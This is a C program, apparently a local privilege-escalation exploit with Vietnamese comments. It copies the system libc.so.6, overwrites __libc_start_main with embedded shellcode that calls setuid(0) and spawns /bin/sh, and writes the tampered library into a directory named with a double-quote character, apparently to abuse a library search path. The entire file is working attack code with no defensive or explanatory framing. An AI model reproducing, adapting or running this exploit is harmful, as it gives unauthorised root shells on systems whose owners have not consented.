#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define OUTPUT_LIBC "./\"/libc.so.6"

// Shellcode execve("/bin/sh", NULL, NULL)
unsigned char shellcode[] = 
    "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48"
    "\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

int find_libc_start_main_offset(const char *libc_path) {
    char command[512];
    snprintf(command, sizeof(command), "nm -D %s | grep '__libc_start_main@@GLIBC_2.34'", libc_path);

    FILE *fp = popen(command, "r");
    if (!fp) {
        perror("popen");
        return -1;
    }

    char buffer[256];
    if (!fgets(buffer, sizeof(buffer), fp)) {
        perror("fgets");
        pclose(fp);
        return -1;
    }

    pclose(fp);
    return (int)strtol(buffer, NULL, 16);
}

int main() {
    int offset = find_libc_start_main_offset(LIBC_PATH);
    if (offset < 0) {
        fprintf(stderr, "Failed to find __libc_start_main offset.\n");
        return 1;
    }
    
    // Mở file libc.so.6 gốc
    int fd = open(LIBC_PATH, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Lấy kích thước file
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    // Đọc nội dung file
    char *lib = malloc(size);
    if (!lib) {
        perror("malloc");
        close(fd);
        return 1;
    }
    read(fd, lib, size);
    close(fd);

    // Chèn shellcode vào vị trí __libc_start_main
    memcpy(lib + offset, shellcode, sizeof(shellcode) - 1);

    // Tạo thư mục "./\""
    mkdir("./\"", 0755);

    // Ghi file mới
    int out_fd = open(OUTPUT_LIBC, O_CREAT | O_WRONLY, 0755);
    if (out_fd < 0) {
        perror("open output file");
        free(lib);
        return 1;
    }

    write(out_fd, lib, size);
    close(out_fd);
    free(lib);

    printf("Modified libc.so.6 written to %s\n", OUTPUT_LIBC);
    return 0;
}
